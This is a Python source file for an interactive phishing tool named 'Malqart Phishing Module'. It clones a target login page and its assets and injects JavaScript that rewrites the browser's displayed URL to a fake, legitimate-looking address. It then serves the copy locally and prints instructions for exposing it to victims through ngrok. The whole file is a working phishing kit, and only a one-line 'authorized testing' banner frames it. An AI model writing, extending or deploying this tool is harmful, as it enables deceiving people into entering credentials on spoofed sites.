#!/usr/bin/env python3
import os
import sys
import requests
import re
import urllib.parse
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import webbrowser # Optional: auto-open the local server

class PhishingSession:
    def __init__(self):
        self.target_url = None
        self.output_dir = "malqart_phish_clone"
        self.include_resources = True # Attempt to download CSS, JS, images
        self.start_server = True # Start the local server after cloning
        self.auto_open = False # Auto-open the local server in browser (optional)
        self.server_port = 8000 # Port for the local server
        self.fake_url = "" # The URL to display in the browser's address bar (e.g., the original target URL)

    def show_options(self):
        print("\nModule options:")
        print(f"  TARGET_URL        => {self.target_url}")
        print(f"  FAKE_URL          => {self.fake_url} (URL to show in browser)")
        print(f"  OUTPUT_DIR        => {self.output_dir}")
        print(f"  INCLUDE_RESOURCES => {self.include_resources}")
        print(f"  START_SERVER      => {self.start_server}")
        print(f"  AUTO_OPEN         => {self.auto_open}")
        print(f"  SERVER_PORT       => {self.server_port}\n")

    def clone_page(self):
        """Clone the target page and its resources."""
        if not self.target_url:
            print("[-] TARGET_URL not set. Use 'set TARGET_URL https://example.com/login'.")
            return False

        print(f"[*] Cloning page: {self.target_url}")
        print(f"[*] Output directory: {self.output_dir}")
        if self.fake_url:
            print(f"[*] Will fake URL in browser: {self.fake_url}")

        try:
            response = requests.get(self.target_url)
            response.raise_for_status()
            main_html = response.text
        except requests.RequestException as e:
            print(f"[-] Failed to fetch main page: {e}")
            return False

        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)

        # Find and download resources (if enabled)
        if self.include_resources:
            main_html = self._download_resources(main_html, self.target_url)

        # Inject JavaScript to change the displayed URL
        if self.fake_url:
            main_html = self._inject_fake_url_js(main_html)

        # Save the main HTML file
        main_filename = "index.html"
        with open(os.path.join(self.output_dir, main_filename), "w", encoding="utf-8") as f:
            f.write(main_html)

        print(f"[+] Main page saved as {os.path.join(self.output_dir, main_filename)}")
        print("[*] Cloning completed.")
        return True

    def _inject_fake_url_js(self, html_content):
        """Inject JavaScript to modify the browser's displayed URL."""
        # The JavaScript code to inject
        js_code = f"""
        <script>
        // Malqart Phishing Module: Fake URL Script
        // This script attempts to change the URL displayed in the browser's address bar.
        // Note: This uses history.pushState and only changes the *displayed* URL, not the origin server.
        try {{
            // Check if the History API is available
            if (window.history && window.history.pushState) {{
                // Replace the current URL in the browser history with the fake URL
                window.history.replaceState(null, null, "{self.fake_url}");
                // Alternatively, push a new state (creates a back button entry)
                // window.history.pushState(null, null, "{self.fake_url}");
                console.log("[MalqartPhish] Faked URL set to: {self.fake_url}");
            }} else {{
                console.warn("[MalqartPhish] History API not available for URL faking.");
            }}
        }} catch (e) {{
            console.error("[MalqartPhish] Error injecting fake URL:", e);
        }}
        </script>
        """

        # Inject the script into the <head> section of the HTML
        # Find the closing </head> tag
        head_end_match = re.search(r'</head>', html_content, re.IGNORECASE)
        if head_end_match:
            # Insert the JS code before the </head> tag
            insert_pos = head_end_match.start()
            modified_html = html_content[:insert_pos] + js_code + html_content[insert_pos:]
            return modified_html
        else:
            # If no </head> tag is found, append the script to the end of the <html> tag or just add it at the end
            # This is a fallback, ideally the page has a head tag
            print("[-] No '</head>' tag found in the HTML. Appending fake URL script to the end of HTML.")
            return html_content + js_code


    def _download_resources(self, html_content, base_url):
        """Attempt to download linked resources (CSS, JS, images) and update HTML."""
        resource_patterns = [
            (r'<link[^>]*href=["\']([^"\']*(?:\.css|\.js|\.png|\.jpg|\.jpeg|\.gif|\.ico|\.svg|\.woff|\.woff2|\.ttf|\.eot))["\'][^>]*>', 'href'),
            (r'<script[^>]*src=["\']([^"\']*(?:\.js))["\'][^>]*>', 'src'),
            (r'<img[^>]*src=["\']([^"\']*(?:\.png|\.jpg|\.jpeg|\.gif|\.svg|\.ico))["\'][^>]*>', 'src'),
        ]

        for pattern, attr_name in resource_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for resource_url in matches:
                full_url = urllib.parse.urljoin(base_url, resource_url)
                filename = os.path.basename(urllib.parse.urlparse(full_url).path)
                if not filename: # Skip if no filename
                    continue

                local_path = os.path.join(self.output_dir, filename)
                try:
                    print(f"    [+] Downloading resource: {resource_url}")
                    res_response = requests.get(full_url)
                    res_response.raise_for_status()
                    with open(local_path, "wb") as res_file:
                        res_file.write(res_response.content)
                    # Update the HTML to point to the local file
                    html_content = html_content.replace(resource_url, filename)
                except requests.RequestException as e:
                    print(f"    [-] Failed to download resource {resource_url}: {e}")
                except OSError as e:
                    print(f"    [-] Failed to save resource {resource_url} (invalid filename?): {e}")
        return html_content

    def start_local_server(self):
        """Start a simple HTTP server in the output directory."""
        if not self.start_server:
            print("[*] Server start disabled by option 'START_SERVER'.")
            return

        os.chdir(self.output_dir) # Change to the cloned directory
        handler = SimpleHTTPRequestHandler
        httpd = HTTPServer(("localhost", self.server_port), handler)

        print(f"[+] Starting local HTTP server at http://localhost:{self.server_port}/")
        print(f"[*] Cloned site is accessible locally at: http://localhost:{self.server_port}/")
        if self.fake_url:
             print(f"[*] Browser will attempt to display URL as: {self.fake_url} (due to injected JS)")
        print("[!] WARNING: This server is only accessible locally by default.")
        print("[!] To share with victims, you need to expose this port publicly using a reverse proxy (e.g., ngrok, cloudflared).")
        print("    Example ngrok command: ngrok http 8000")
        print("    Your public phishing link will be the ngrok URL (e.g., https://abc123.ngrok.io)")
        print("    The FAKE_URL will be applied by the injected JS once the victim visits the public link.")

        if self.auto_open:
            try:
                webbrowser.open(f"http://localhost:{self.server_port}/")
            except Exception:
                pass # Ignore if browser opening fails

        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[+] Server stopped.")

    def run_phishing(self):
        success = self.clone_page()
        if success and self.start_server:
            print("\n[*] Launching local server...")
            # Run server in a separate thread so main thread can handle other tasks if needed
            server_thread = threading.Thread(target=self.start_local_server, daemon=True)
            server_thread.start()
            try:
                server_thread.join() # Wait for server thread to finish (on interrupt)
            except KeyboardInterrupt:
                print("\n[!] Phishing simulation interrupted.")
                return
        elif success:
            print("\n[*] Cloning completed. Server launch skipped.")
            print("[*] To serve the cloned site, navigate to the output directory and use Python's built-in server:")
            print(f"    cd {self.output_dir} && python3 -m http.server {self.server_port}")
            print("[*] Then, expose it publicly using a reverse proxy if needed.")
            if self.fake_url:
                print(f"[*] The cloned HTML in '{self.output_dir}/index.html' contains JavaScript to fake the URL to '{self.fake_url}' when served.")


# ========== CONSOLE ==========
def main():
    session = PhishingSession()
    print("Malqart Phishing Module v1.1 — Webpage Cloner & Local Server (with Fake URL JS)")
    print("⚠️  FOR AUTHORIZED TESTING ONLY. NEVER USE WITHOUT EXPLICIT PERMISSION.\n")

    while True:
        try:
            cmd = input("MalqartPhish > ").strip()
            if not cmd:
                continue

            parts = cmd.split()
            action = parts[0].lower()

            if action in ["exit", "quit"]:
                print("[*] Exiting Malqart Phishing Module.")
                break

            elif action in ["help", "?"]:
                print("""
Commands:
  set TARGET_URL <url>           → Target page to clone (e.g., https://example.com/login) (required)
  set FAKE_URL <url>             → URL to display in victim's browser (e.g., https://legitimate.com) (optional)
  set OUTPUT_DIR <dir>           → Local directory to save cloned files (default: malqart_phish_clone)
  set INCLUDE_RESOURCES <true/false> → Download CSS/JS/images (default: true)
  set START_SERVER <true/false>  → Start local server after cloning (default: true)
  set AUTO_OPEN <true/false>     → Open local server in browser (default: false)
  set SERVER_PORT <port>         → Port for local server (default: 8000)
  show options                   → Display current settings
  run / exploit                  → Clone page and (optionally) start server
  exit                           → Quit
""")

            elif action == "set":
                if len(parts) < 3:
                    print("[-] Usage: set <OPTION> <VALUE>")
                    continue
                opt = parts[1].upper()
                val = ' '.join(parts[2:])
                if opt == "TARGET_URL":
                    session.target_url = val
                elif opt == "FAKE_URL":
                    session.fake_url = val
                elif opt == "OUTPUT_DIR":
                    session.output_dir = val
                elif opt == "INCLUDE_RESOURCES":
                    session.include_resources = val.lower() in ("1", "true", "yes", "on")
                elif opt == "START_SERVER":
                    session.start_server = val.lower() in ("1", "true", "yes", "on")
                elif opt == "AUTO_OPEN":
                    session.auto_open = val.lower() in ("1", "true", "yes", "on")
                elif opt == "SERVER_PORT":
                    try:
                        session.server_port = int(val)
                    except ValueError:
                        print("[-] SERVER_PORT must be an integer.")
                        continue
                else:
                    print("[-] Valid options: TARGET_URL, FAKE_URL, OUTPUT_DIR, INCLUDE_RESOURCES, START_SERVER, AUTO_OPEN, SERVER_PORT")
                    continue
                print(f"[*] {opt} => {val}")

            elif action == "show" and len(parts) > 1 and parts[1].lower() == "options":
                session.show_options()

            elif action in ["run", "exploit"]:
                session.run_phishing()

            else:
                print(f"[-] Unknown command. Type 'help'.")

        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to quit.")
        except EOFError:
            print("\n[*] Exiting.")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
